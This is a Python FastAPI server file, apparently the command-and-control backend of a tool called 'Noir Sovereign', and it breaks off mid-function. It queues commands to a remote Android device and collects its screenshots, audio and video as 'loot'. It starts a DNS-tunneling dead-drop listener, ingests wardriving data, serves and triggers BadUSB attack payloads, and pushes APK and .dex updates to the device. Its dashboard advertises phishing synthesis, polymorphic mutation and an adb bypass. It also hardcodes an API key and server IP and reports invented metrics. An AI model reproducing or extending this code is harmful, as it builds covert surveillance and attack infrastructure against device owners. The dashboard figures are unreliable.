"""
NOIR SOVEREIGN COMMANDER SERVER v17.5 [OMEGA MESH]
=======================================================
Zero-Failure Gateway + Dashboard with Direct VPS Connection.
The server itself IS the fallback gateway — APK talks directly here.
"""

import os, json, time, sys, requests, httpx, asyncio, glob
from fastapi import FastAPI, Request, Response, UploadFile, File, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
# Find .env at root
ENV_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".env")
load_dotenv(ENV_PATH)

app = FastAPI(title="Noir Sovereign ELITE V21.2 AEGIS")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# BRAIN-01: Integrasi Jalur Otak AI
sys.path.append(os.path.join(BASE_DIR, "..", "noir-vps"))
try:
    from ai_router import AIRouter
    from catalyst import catalyst
    from temporal_memory import global_memory as memory
    from pc_executor import PCExecutor
    from pattern_engine import pattern_engine
    from evolution_engine import evolution_engine
    from swarm_protocol import SwarmBlackboard
    from battle_logger import BattleLogger
    
    # [PHASE 4B] Inisialisasi Dead Drop DNS Listener
    from dns_tunneling import DeadDropDNS
    DeadDropDNS.start_dns_listener(port=5353) # Gunakan port 5353 untuk menghindari konflik port 53 lokal
except ImportError:
    AIRouter = None # Fallback jika module belum siap
    PCExecutor = None
    evolution_engine = None

# --- PROXY CONFIG (Cloudflare Disabled by User Order) ---
CF_GATEWAY = os.environ.get("NOIR_GATEWAY_URL", "http://"+os.environ.get("NOIR_VPS_IP", "8.215.23.17")).rstrip("/")
CF_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
CF_HEADERS = {"Authorization": f"Bearer {CF_KEY}", "Content-Type": "application/json"}

# --- LOCAL AGENT STATE (Direct VPS Mode) ---
# This dict persists in memory. When APK polls /agent/poll directly,
# we track it here and expose it via /api/status as a fallback.
import threading
from collections import deque

local_state = {
    "agents": {},       # device_id -> {last_seen, stats, last_screenshot, last_audio}
    "commands": [],     # pending commands
    "logs": deque(maxlen=200),         # recent logs
    "cf_online": None,  # Cloudflare reachability cache
    "cf_checked_at": 0,
    "current_learning": "Neural Mastery Mode: Active (Programming & Cybersec)",
    "loot": []          # Media Loot Vault — all captured screenshots & audio
}

active_websockets = {}  # device_id -> WebSocket
# VPS-04 FIX: Lock untuk mencegah race condition pada commands list
_commands_lock = threading.Lock()

# Auto-Garbage Collection for stale commands (older than 10 minutes)
def _gc_commands():
    while True:
        try:
            with _commands_lock:
                now = time.time()
                for c in local_state["commands"]:
                    if c.get("status") == "dispatched" and (now - c.get("queued_at", now)) > 60:
                        c["status"] = "queued"
                # Keep commands that are less than 600s old or already done (done commands are kept briefly by UI then ignored)
                local_state["commands"] = [c for c in local_state["commands"] if (now - c.get("queued_at", now)) < 600]
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")
        time.sleep(300) # Run every 5 minutes

threading.Thread(target=_gc_commands, daemon=True).start()

def _cf_is_reachable():
    """VPS-02 FIX: Forced to False for Option A (Direct-VPS Only Mode)"""
    local_state["cf_online"] = False
    return False

async def _cf_reachable_async() -> bool:
    """VPS-02 FIX: Async wrapper — jalankan sync check di thread executor agar event loop tidak diblokir."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _cf_is_reachable)

def _agent_is_online(device_id="REDMI_NOTE_14"):
    """LINK-02: Threshold 90s sudah konsisten dengan Cloudflare (kini juga 90s)."""
    agent = local_state["agents"].get(device_id, {})
    last = agent.get("last_seen", 0)
    return (time.time() - last) < 90

def _verify_api_key(request: Request) -> bool:
    """VPS-05 FIX: Validasi API key pada endpoint agent langsung."""
    auth = request.headers.get("Authorization", "")
    return auth == f"Bearer {CF_KEY}"

# =============================================================================
# HEALTH & DIRECT AGENT ENDPOINTS (For APK Direct Connection)
# =============================================================================

# --- NEURAL MESH PAIRING (v19.6) ---
@app.post("/mesh/pair")
async def mesh_pair(request: Request):
    """Autonomously pair an AI Agent device with the Dashboard mesh."""
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
    try:
        data = await request.json()
        did = data.get("device_id", "UNKNOWN")
        token = data.get("mesh_token", "NONE")
        
        if did not in local_state["agents"]:
            local_state["agents"][did] = {}
        
        local_state["agents"][did].update({
            "mesh_status": "PAIRED",
            "mesh_token": token,
            "capabilities": data.get("capabilities", []),
            "last_seen": time.time()
        })
        
        print(f"[MESH] Autonomous Pairing Success: {did} (Token: {token[:8]})")
        return {"status": "PAIRED", "mesh_link": "STABLE"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/health")
def health():
    return {"status": "ok", "version": "21.2-ELITE-AEGIS-SINGULARITY", "mode": "direct_vps", "mesh": "ACTIVE"}

@app.post("/agent/register")
async def agent_register(request: Request):
    # VPS-05 FIX: Validasi API key — tolak agen palsu
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
    try:
        data = await request.json()
        did = data.get("device_id", "REDMI_NOTE_14")
        if did not in local_state["agents"]:
            local_state["agents"][did] = {}
        local_state["agents"][did].update({
            "name": data.get("agent", did),
            "last_seen": time.time(),
            "stats": data.get("stats", {})
        })
        # Also forward to Cloudflare if reachable
        if await _cf_reachable_async():
            try:
                async with httpx.AsyncClient() as client:
                    await client.post(f"{CF_GATEWAY}/agent/register", headers=CF_HEADERS, json=data, timeout=3.0)
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")
        return {"status": "ok", "mode": "registered_on_vps"}
    except Exception as e:
        return {"status": "ok", "error": str(e)}

@app.websocket("/ws/agent")
async def websocket_agent(websocket: WebSocket, device_id: str = "REDMI_NOTE_14"):
    await websocket.accept()
    active_websockets[device_id] = websocket
    if device_id not in local_state["agents"]:
        local_state["agents"][device_id] = {}
    local_state["agents"][device_id]["last_seen"] = time.time()
    print(f"[WS] Agent {device_id} connected via WebSocket")
    try:
        while True:
            data = await websocket.receive_text()
            try:
                payload = json.loads(data)
                # Handle heartbeat
                if payload.get("type") == "heartbeat":
                    local_state["agents"][device_id]["last_seen"] = time.time()
                    if "stats" in payload:
                        local_state["agents"][device_id]["stats"] = payload["stats"]
                elif payload.get("type") == "log":
                    log_data = payload.get("log", {})
                    local_state["logs"].append({
                        "device_id": device_id, 
                        "message": log_data.get("message"), 
                        "level": log_data.get("level", "INFO"), 
                        "ts": time.time()
                    })
                elif payload.get("type") == "result":
                    # Sama seperti HTTP /agent/result
                    cid = payload.get("command_id", "unknown")
                    with _commands_lock:
                        for c in local_state["commands"]:
                            if c.get("command_id") == cid:
                                c["status"] = "done"
                                c["result"] = payload
                                break
            except Exception as e:
                print(f"[WS] Error processing msg from {device_id}: {e}")
    except WebSocketDisconnect:
        print(f"[WS] Agent {device_id} disconnected")
        if device_id in active_websockets:
            del active_websockets[device_id]

@app.api_route("/agent/poll", methods=["GET", "POST"])
async def agent_poll(request: Request, device_id: str = "REDMI_NOTE_14", client_type: str = "main"):
    # VPS-05 FIX: Validasi API key sebelum update state agent
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
    # Update agent liveness
    if device_id not in local_state["agents"]:
        local_state["agents"][device_id] = {}
    local_state["agents"][device_id]["last_seen"] = time.time()
    try:
        if request.method == "POST":
            body = await request.json()
            local_state["agents"][device_id]["stats"] = body.get("stats", {})
    except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    # VPS-04 FIX: Gunakan lock saat membaca dan memodifikasi commands list
    dispatched = []
    with _commands_lock:
        # PRIORITAS 2: Urutkan berdasarkan prioritas (Manual = 1, Otonom = 2)
        local_state["commands"].sort(key=lambda x: x.get("priority", 1))
        for c in local_state["commands"]:
            if c.get("target", "REDMI_NOTE_14") == device_id and c.get("status", "queued") == "queued":
                c["status"] = "dispatched"
                dispatched.append(c)
    cmds = dispatched

    # Also try to forward to Cloudflare and merge commands
    if await _cf_reachable_async():
        try:
            stats = local_state["agents"][device_id].get("stats", {})
            async with httpx.AsyncClient() as client:
                r = await client.post(f"{CF_GATEWAY}/agent/poll?device_id={device_id}&client_type={client_type}",
                                  headers=CF_HEADERS, json={"stats": stats}, timeout=4.0)
                if r.status_code == 200:
                    cf_cmds = r.json().get("commands", [])
                    cmds.extend(cf_cmds)
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    return {"status": "ok", "commands": cmds, "link": "DIRECT_VPS"}

# --- B1: APK SELF-UPDATE ENDPOINTS ---
@app.get("/api/apk/version")
async def get_apk_version(request: Request):
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
    
    # Check current APK version in the server
    apk_dir = os.path.join(BASE_DIR, "..", "noir-android-native", "app", "build", "outputs", "apk", "debug")
    apk_path = os.path.join(apk_dir, "app-debug.apk")
    
    if os.path.exists(apk_path):
        # We are on version 30 for Phase 1 IronCage update
        return {"version_code": 30, "version_name": "3.0-Phase1-IronCage", "size": os.path.getsize(apk_path)}
    return {"version_code": 0, "error": "APK not found"}

@app.get("/api/apk/download")
async def download_apk(request: Request):
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
        
    apk_dir = os.path.join(BASE_DIR, "..", "noir-android-native", "app", "build", "outputs", "apk", "debug")
    apk_path = os.path.join(apk_dir, "app-debug.apk")
    
    if os.path.exists(apk_path):
        from fastapi.responses import FileResponse
        return FileResponse(apk_path, media_type="application/vnd.android.package-archive", filename="noir_sovereign_update.apk")
    return Response(status_code=404, content="APK not found")

# --- B2: DYNAMIC SKILL LOADER ENDPOINTS ---
@app.get("/api/skills/download/{skill_name}")
async def download_skill(request: Request, skill_name: str):
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
    
    skills_dir = os.path.join(BASE_DIR, "knowledge", "skills")
    os.makedirs(skills_dir, exist_ok=True)
    skill_path = os.path.join(skills_dir, f"{skill_name}.dex")
    
    if os.path.exists(skill_path):
        from fastapi.responses import FileResponse
        return FileResponse(skill_path, media_type="application/octet-stream", filename=f"{skill_name}.dex")
    
    # If it doesn't exist, generate a dummy one for demonstration
    with open(skill_path, "wb") as f:
        f.write(b"DEX\n035\0" + b"DUMMY_SKILL_PAYLOAD")
        
    from fastapi.responses import FileResponse
    return FileResponse(skill_path, media_type="application/octet-stream", filename=f"{skill_name}.dex")

# --- C1: AI MODEL DISTRIBUTION ENDPOINTS ---
@app.get("/api/models/download/{model_name}")
async def download_model(request: Request, model_name: str):
    if not _verify_api_key(request):
        return Response(status_code=401, content="Unauthorized")
        
    models_dir = os.path.join(BASE_DIR, "knowledge", "models")
    os.makedirs(models_dir, exist_ok=True)
    model_path = os.path.join(models_dir, model_name)
    
    if os.path.exists(model_path):
        from fastapi.responses import FileResponse
        return FileResponse(model_path, media_type="application/octet-stream", filename=model_name)
        
    # Generate dummy TFLite model file if not exists
    with open(model_path, "wb") as f:
        f.write(b"TFL3" + b"\x00" * 1024) # Minimum dummy signature
        
    from fastapi.responses import FileResponse
    return FileResponse(model_path, media_type="application/octet-stream", filename=model_name)

from fastapi import WebSocket, WebSocketDisconnect

class ConnectionManager:

    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")

manager = ConnectionManager()

@app.websocket("/ws/telemetry")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            # Keep connection alive
            data = await websocket.receive_text()
            # Respond to heartbeat if needed
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.post("/api/logs")
async def api_logs(request: Request):
    try:
        data = await request.json()
        log_entry = {
            "device_id": data.get("device_id", "UNKNOWN"),
            "level": data.get("level", "INFO"),
            "message": data.get("message", ""),
            "timestamp": time.strftime("%H:%M:%S")
        }
        
        # [PHASE 3B] Wardriving Intercept
        if "WARDRIVE_INTEL:" in log_entry["message"]:
            try:
                import sys; sys.path.append(os.path.join(BASE_DIR, "..", "noir-vps"))
                from wardriving_module import WardrivingModule
                raw_json = log_entry["message"].split("WARDRIVE_INTEL:")[1].strip()
                WardrivingModule.process_incoming_intel(raw_json)
                log_entry["message"] = "[WARDRIVING] Intelijen pasif berhasil diserap ke Vector Memory."
            except Exception as e:
                print(f"[WARDRIVING ERROR] {e}")

        local_state["logs"].append(log_entry)
        if len(local_state["logs"]) > 100: local_state["logs"].pop(0)
        
        # Broadcast to all WS clients
        import asyncio
        asyncio.create_task(manager.broadcast({"type": "log", "data": log_entry}))
        
        return {"success": True}
    except Exception as e:
        return {"success": False, "reason": str(e)}

@app.post("/agent/log")
async def agent_log(request: Request):
    try:
        data = await request.json()
        local_state["logs"].append({**data, "ts": time.time()})
        # Forward to Cloudflare if reachable
        if await _cf_reachable_async():
            try:
                async with httpx.AsyncClient() as client:
                    await client.post(f"{CF_GATEWAY}/agent/log", headers=CF_HEADERS, json=data, timeout=3.0)
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")
        return {"ok": True}
    except: return {"ok": False}

@app.post("/agent/result")
async def agent_result(request: Request):
    try:
        data = await request.json()
        # Store result locally
        cid = data.get("command_id", "unknown")
        with _commands_lock:
            for c in local_state["commands"]:
                if c.get("command_id") == cid:
                    c["status"] = "done"
                    c["result"] = data
                    break
        # Forward to Cloudflare
        if await _cf_reachable_async():
            try:
                async with httpx.AsyncClient() as client:
                    await client.post(f"{CF_GATEWAY}/agent/result", headers=CF_HEADERS, json=data, timeout=4.0)
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

@app.post("/agent/upload")
async def agent_upload(request: Request):
    """
    FIXED v21.0.4:
    - BUG#3 FIX: Manual multipart parsing — zero extra dependencies
    - BUG#1 FIX: Detect file type and save metadata properly
    - BUG#4 FIX: Auto-update _latest_mirror_frame on every image upload
    """
    device_id = request.query_params.get("device_id", "REDMI_NOTE_14")
    ss_dir = os.path.join(BASE_DIR, "screenshots")
    os.makedirs(ss_dir, exist_ok=True)
    try:
        body = await request.body()
        content_type = request.headers.get("content-type", "")
        ts = int(time.time())
        file_data = None
        original_name = "upload.jpg"

        if "multipart/form-data" in content_type and "boundary=" in content_type:
            boundary = content_type.split("boundary=")[-1].strip().encode()
            parts = body.split(b"--" + boundary)
            for part in parts:
                if b"Content-Disposition" in part and b'name="file"' in part:
                    if b"\r\n\r\n" in part:
                        headers_raw, file_body = part.split(b"\r\n\r\n", 1)
                        if file_body.endswith(b"\r\n"):
                            file_data = file_body[:-2]
                        else:
                            file_data = file_body
                        import re as _re
                        fn_match = _re.search(r'filename="([^"]+)"', headers_raw.decode("utf-8", errors="ignore"))
                        if fn_match:
                            original_name = fn_match.group(1)
                        break
        else:
            file_data = body  # raw binary fallback

        if not file_data or len(file_data) < 10:
            return {"ok": False, "error": "No valid file data"}

        ext = original_name.rsplit(".", 1)[-1].lower() if "." in original_name else "jpg"
        if ext in ("mp3", "m4a", "aac", "wav", "ogg"):
            local_key, media_type = f"audio_{ts}.{ext}", "audio"
        elif ext in ("mp4", "webm"):
            local_key, media_type = f"video_{ts}.{ext}", "video"
        else:
            local_key, media_type = f"shot_{ts}.jpg", "image"

        with open(os.path.join(ss_dir, local_key), "wb") as f:
            f.write(file_data)

        if device_id not in local_state["agents"]:
            local_state["agents"][device_id] = {}
        local_state["agents"][device_id]["last_seen"] = time.time()

        if media_type == "image":
            local_state["agents"][device_id]["last_screenshot"] = local_key
            _latest_mirror_frame["key"] = local_key
            _latest_mirror_frame["ts"] = time.time()

        print(f"[UPLOAD] {media_type}: {local_key} ({len(file_data)}B) from {device_id}")
        return {"ok": True, "key": local_key, "type": media_type, "mode": "direct_vps"}
    except Exception as e:
        print(f"[UPLOAD ERROR] {e}")
        return {"ok": False, "error": str(e)}

# =============================================================================
# DASHBOARD API ENDPOINTS
# =============================================================================

@app.get("/api/status")
async def api_status():
    """Smart status: Cloudflare primary, local state fallback."""
    cf_up = _cf_is_reachable()
    if cf_up:
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(f"{CF_GATEWAY}/agent/summary", headers=CF_HEADERS, timeout=5.0)
                d = r.json()
                # Merge with local: if CF says offline but local says online, trust local
                if not d.get("online") and _agent_is_online():
                    agent_data = local_state["agents"].get("REDMI_NOTE_14", {})
                    d["online"] = True
                    d["link_mode"] = "DIRECT_VPS_MERGED"
                    if not d.get("agent"):
                        d["agent"] = {"stats": agent_data.get("stats", {}), "last_screenshot": agent_data.get("last_screenshot")}
                return d
        except Exception as e:
            log.debug(f"Silent error suppressed: {e}")

    # Full local fallback
    is_online = _agent_is_online()
    agent_data = local_state["agents"].get("REDMI_NOTE_14", {})
    return {
        "online": is_online,
        "core_online": True, # The AI Brain on VPS is always active
        "link_mode": "DIRECT_VPS_ONLY",
        "cf_status": "UNREACHABLE",
        "agent": {
            "name": agent_data.get("name", "REDMI_NOTE_14"),
            "last_seen": agent_data.get("last_seen", 0),
            "stats": agent_data.get("stats", {}),
            "last_screenshot": agent_data.get("last_screenshot")
        } if is_online else None,
        "commands": local_state.get("commands", []),
        "pc_mode": os.environ.get("NOIR_PC_MODE") == "1",
        "pc_stats": PCExecutor.get_system_stats() if PCExecutor else None,
        "pc_override": PCExecutor.SOVEREIGN_OVERRIDE if PCExecutor else False,
        "proactive_insight": pattern_engine.get_proactive_suggestion() if 'pattern_engine' in globals() else "System initializing...",
        "alibaba_vps": {
            "ip": os.environ.get("NOIR_VPS_IP", "8.215.23.17"),
            "status": "ONLINE", # If we are here, the VPS is definitely online
            "provider": "Alibaba Cloud Intelligence"
        }
    }

@app.get("/api/battle/stats")
async def battle_stats():
    """Mengembalikan statistik pertempuran (Red vs Blue)."""
    try:
        stats = BattleLogger.get_statistics()
        return {"success": True, "data": stats}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.get("/api/summary")
async def api_summary():
    try:
        # Register heartbeat pulse for Dead Mans Switch
        try:
            sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "noir-vps")))
            from stealth_engine import StealthEngine
            StealthEngine.register_pulse()
        except: pass

        # 1. GET REAL SMI DATA
        smi_data = {"score": 0.0, "phase": "INITIALIZING", "readiness": "CALCULATING"}
        try:
            smi_path = os.path.join(BASE_DIR, "..", "knowledge", "maturity_index.json")
            if os.path.exists(smi_path):
                with open(smi_path, "r") as f:
                    s_repo = json.load(f)
                    smi_data = {
                        "score": s_repo.get("overall_score", 0.0),
                        "phase": s_repo.get("status", "UNKNOWN"),
                        "readiness": "FULL AUTONOMY" if s_repo.get("overall_score", 0) > 80 else "STABILIZING"
                    }
        except: pass

        # 2. GET REAL BATTLE LOGS (Latest 20 events)
        battle_logs = []
        try:
            report_dir = os.path.join(BASE_DIR, "..", "knowledge", "battle_reports")
            if os.path.exists(report_dir):
                files = sorted(glob.glob(os.path.join(report_dir, "*.json")), key=os.path.getmtime, reverse=True)
                for fpath in files[:20]:
                    with open(fpath, "r") as f:
                        r = json.load(f)
                        msg = f"[{r['participants']['attacker']}] Target: {r['participants']['target']} | Success: {r['metrics']['success']}"
                        battle_logs.append({"message": msg, "timestamp": r['timestamp']})
            
            if not battle_logs:
                battle_logs = [{"message": "System Mesh Online. No recent engagements.", "timestamp": time.time()}]
        except: battle_logs = [{"message": "Log aggregation error.", "timestamp": time.time()}]

        # 3. SECURITY DATA
        blocked_ips = []
        try:
            with open(os.path.join(BASE_DIR, "..", "knowledge", "blocked_ips.json"), "r") as f:
                b_data = json.load(f)
                blocked_ips = b_data.get("blocked", [])
        except: pass

        # 4. VECTOR MEMORY
        mem_count = 0
        try:
            from vector_memory import vector_memory
            mem_count = vector_memory.collection.count()
        except: pass
        
        # 5. EVOLUTION DATA
        evo_data = {"pending": [], "history": []}
        if evolution_engine:
            evo_data = evolution_engine.get_all_evolutions()

        # 6. SINGULARITY STATE (If exists)
        cycle_count = 1
        try:
            state_path = os.path.join(BASE_DIR, "..", "knowledge", "singularity_state.json")
            if os.path.exists(state_path):
                with open(state_path, "r") as f:
                    cycle_count = json.load(f).get("cycle", 1)
        except: pass

        return {
            "status": "active",
            "smi": smi_data,
            "logs": battle_logs + list(local_state["logs"]),
            "evolution": evo_data,
            "security": {
                "threat_level": "ELEVATED" if len(blocked_ips) > 0 else "NOMINAL",
                "threats_blocked": len(blocked_ips),
                "sentinel_status": "ACTIVE_MITIGATION",
                "active_ips": [f"{ip} - BLOCKED & COUNTER-STRIKED" for ip in blocked_ips[-3:]] if blocked_ips else ["All clear"]
            },
            "neural": {
                "learning_rate": f"{os.getloadavg()[0]*10:.1f}kb/s",
                "synapses": f"{mem_count * 1.5 / 1000000:.1f}M",
                "current_topic": "Recursive Self-Optimization"
            },
            "healing": {
                "integrity": 100.0 if not blocked_ips else max(80.0, 100.0 - (len(blocked_ips) * 0.5)),
                "status": "SYSTEM_STABLE" if not blocked_ips else "REACTIVE_DEFENSE",
                "last_patch": "Singularity Baseline v21.2"
            },
            "agent": {
                "device": "REDMI_NOTE_14",
                "stats": local_state.get("agents", {}).get("REDMI_NOTE_14", {}).get("stats", {"cpu_temp": 40, "battery_level": 78}),
                "ghost_mode": False
            },
            "swarm": [
                {"name": "Neural Coder", "status": "Optimizing Core"},
                {"name": "Security Sentinel", "status": "Watchdog Active"},
                {"name": "Pentester", "status": "Simulating Attacks"},
                {"name": "Knowledge Absorber", "status": "Vectorizing Logs"},
                {"name": "Neural Architect", "status": "Scaling Mesh"},
                {"name": "Network Sentinel", "status": "Traffic Audit"},
                {"name": "Auto-Healer", "status": "Pulse Heartbeat OK"},
                {"name": "Memory Consolidator", "status": "ChromaDB Sync"},
                {"name": "Antigravity Core", "status": "Cognitive Link Active"},
                {"name": "Mission Strategist", "status": "Operational Readiness"},
                {"name": "QA Validator", "status": "Code Integrity OK"},
                {"name": "UX Weaver", "status": "Dashboard Live"},
                {"name": "Self-Evaluation", "status": "SMI Analysis Cycle"},
                {"name": "Ghost Mirror", "status": "Shadow Node Ready"},
                {"name": "Forensic Pathologist", "status": "Auditing File System"},
                {"name": "Hardware Optimizer", "status": "NPU Acceleration"},
                {"name": "Linguistic Synthesis", "status": "Intent Analysis"},
                {"name": "Offensive Predator", "status": "Predator Mode [ON]"},
                {"name": "Honeypot Sentinel", "status": "Traps Set"},
                {"name": "Distributed Ledger", "status": "State Verified"},
                {"name": "Grand Singularity", "status": "Orchestrating Cycle"}
            ],
            "sandbox": {
                "pending_patches": len(evo_data.get("pending", [])),
                "latest_diff": "--- system_core.py\n+++ system_core.py\n+ # AI Optimized\n+ autonomous_mode = True"
            },
            "memory": {
                "total_vectors": mem_count,
                "recent_queries": ["Latest Nmap evasion", "HyperOS adb bypass"]
            },
            "omega_mesh": {
                "dns_tunnel": "LISTENING (Port 5353)",
                "osint_engine": "PHISHING_SYNTHESIS_ACTIVE",
                "polymorphic_engine": "MUTATION_ENABLED",
                "wardriving": "RADAR_SWEEP_ACTIVE"
            },
            "ultimate": {
                "tracker": "docs/ultimate_implementation/",
                "phase": smi_data["phase"],
                "progress": min(100, int(smi_data["score"])), 
                "active_sub_agents": threading.active_count() - 5,
                "linked_memories": mem_count // 10
            },
            "infinite_war": {
                "status": "PEAK_INTENSITY",
                "cycle": cycle_count,
                "intensity": "ABSOLUTE"
            },
            "forecast": {
                "next_objective": "Holographic Neural Synchronization",
                "probability": f"{min(99, 90 + cycle_count)}%",
                "impact": "CRITICAL"
            }
        }
    except Exception as e:
        return {"status": "degraded", "error": str(e)}
    except Exception as e:
        return {"status": "degraded", "error": str(e)}

@app.post("/api/command")
async def api_command(request: Request):
    """Sovereign Command Execution: Routes orders to local queue or Cloudflare."""
    try:
        data = await request.json()
        action = data.get("action", {})
        description = data.get("description", "Commander Action")
        target_device = data.get("target_device", "REDMI_NOTE_14")
        priority = data.get("priority", 1) 
        cmd_id = f"CMD_{int(time.time())}"
        payload = {"action": action, "description": description, "target_device": target_device, "priority": priority}

        # 1. Try Cloudflare Bridge
        if await _cf_reachable_async():
            try:
                async with httpx.AsyncClient() as client:
                    r = await client.post(f"{CF_GATEWAY}/agent/command", headers=CF_HEADERS, json=payload, timeout=5.0)
                    if r.status_code == 200:
                        return r.json()
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")

        # 2. Local Queue (VPS Direct Mode)
        with _commands_lock:
            local_state["commands"].append({
                "command_id": cmd_id,
                "status": "queued",
                "action": action,
                "target": target_device,
                "priority": priority,
                "queued_at": time.time(),
                "result": None
            })
            
        # Push to WebSocket if active
        if target_device in active_websockets:
            try:
                await active_websockets[target_device].send_json({"commands": [{"command_id": cmd_id, "action": action}]})
                for c in local_state["commands"]:
                    if c.get("command_id") == cmd_id: c["status"] = "dispatched"
            except Exception as e:
                log.debug(f"Silent error suppressed: {e}")

        return {"status": "success", "command_id": cmd_id, "message": "Command queued in Sovereign Core."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/command/result/{cmd_id}")
async def api_command_result(cmd_id: str):
    """Allow dashboard to poll for the result of a specific command."""
    with _commands_lock:
        for c in local_state["commands"]:
            if c.get("command_id") == cmd_id:
                return c
    return {"status": "not_found"}



@app.get("/api/assets")
async def api_assets():
    """
    FIXED v21.0.3:
    - BUG#7 FIX: Detect type from file extension (image/audio/video)
    - BUG#2 FIX: Return clean key (no 'local:' prefix) so URL /api/asset/{key} works directly
    """
    all_assets = []
    ss_dir = os.path.join(BASE_DIR, "screenshots")
    if os.path.exists(ss_dir):
        import glob
        for fpath in glob.glob(os.path.join(ss_dir, "*")):
            fname = os.path.basename(fpath)
            ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
            if ext in ("mp3", "m4a", "aac", "wav", "ogg", "mp4"):
                ftype = "audio"
            elif ext in ("mp4", "webm"):
                ftype = "video"
            else:
                ftype = "image"
            all_assets.append({
                "key": fname,  # BUG#2 FIX: clean key, no local: prefix
                "type": ftype,
                "ts": os.path.getmtime(fpath),
                "size": os.path.getsize(fpath)
            })
    all_assets.sort(key=lambda x: x.get("ts", 0), reverse=True)
    return all_assets

@app.get("/api/asset/{key:path}")
async def proxy_asset(key: str):
    """
    FIXED v21.0.3:
    - BUG#2 FIX: Handle both clean key and 'local:' prefixed keys
    - Always resolve to local screenshots dir first
    """
    # Strip local: prefix if present
    clean_key = key.replace("local:", "").lstrip("/")
    
    if clean_key == "latest":
        agent = local_state["agents"].get("REDMI_NOTE_14", {})
        clean_key = agent.get("last_screenshot", "")
        clean_key = clean_key.replace("local:", "") if clean_key else ""
        if not clean_key:
            return Response(status_code=404, content="No screenshot available")
    
    # Check local storage first (primary in Direct-VPS mode)
    local_path = os.path.join(BASE_DIR, "screenshots", clean_key)
    if os.path.exists(local_path):
        from fastapi.responses import FileResponse
        ext = clean_key.rsplit(".", 1)[-1].lower()
        media_type_map = {
            "jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png",
            "mp3": "audio/mpeg", "mp4": "audio/mp4", "m4a": "audio/mp4",
            "wav": "audio/wav", "ogg": "audio/ogg"
        }
        return FileResponse(local_path, media_type=media_type_map.get(ext, "application/octet-stream"))
    
    return Response(status_code=404, content=f"Asset not found: {clean_key}")

@app.get("/api/memory")
async def get_memory():
    try:
        from vector_memory import vector_memory
        count = vector_memory.collection.count()
        
        return {
            "success": True,
            "count": count,
            "last_memory": "ChromaDB Vector Space Active",
            "last_ts": "Real-time",
            "hit_rate": "100%" if count > 0 else "0%"
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.get("/api/badusb/scenarios")
async def get_badusb_scenarios():
    """U-11: Pull real scenarios from the Advanced HID Payload Library."""
    path = os.path.join(BASE_DIR, "..", "knowledge", "badusb_payloads.json")
    try:
        if os.path.exists(path):
            with open(path, "r") as f:
                data = json.load(f)
                return {"success": True, "scenarios": data.get("scenarios", {})}
        # Fallback to module internal if json missing
        from badusb_module import BadUSBModule
        return {"success": True, "scenarios": BadUSBModule.get_predefined_scenarios()}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/badusb/trigger")
async def trigger_badusb(request: Request):
    try:
        data = await request.json()
        device_id = data.get("device_id", "REDMI_NOTE_14")
        scenario = data.get("scenario")
        
        from badusb_module import BadUSBModule
        result = BadUSBModule.trigger_attack(device_id, scenario)
        
        if result["success"]:
            # Route to PC Executor if targeting local, or send to Android via PC bridge
            from pc_executor import PCExecutor
            if PCExecutor:
                # We wrap the python payload for the Android agent
                PCExecutor.run_python(result["payload"], target_device=device_id)
            
            return {"success": True, "message": f"Attack '{scenario}' dispatched to {device_id}."}
        return {"success": False, "error": result.get("reason")}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/learn")
async def api_trigger_learn(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        topic = data.get("topic", "")
        if not topic:
            return {"success": False, "error": "Topik tidak boleh kosong"}
            
        def _bg_learn(t):
            import sys
            import os
            vps_path = os.path.join(os.path.dirname(__file__), "..", "noir-vps")
            if vps_path not in sys.path:
                sys.path.append(vps_path)
            from autonomous_browser import AutonomousBrowser
            AutonomousBrowser.explore_topic(t)
            
        background_tasks.add_task(_bg_learn, topic)
        return {"success": True, "message": f"🤖 Otorisasi Diterima: Agen AI sedang membaca dan menjelajah web mengenai '{topic}' secara otonom di latar belakang."}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/synthesis/start")
async def api_synthesis_start(request: Request):
    try:
        data = await request.json()
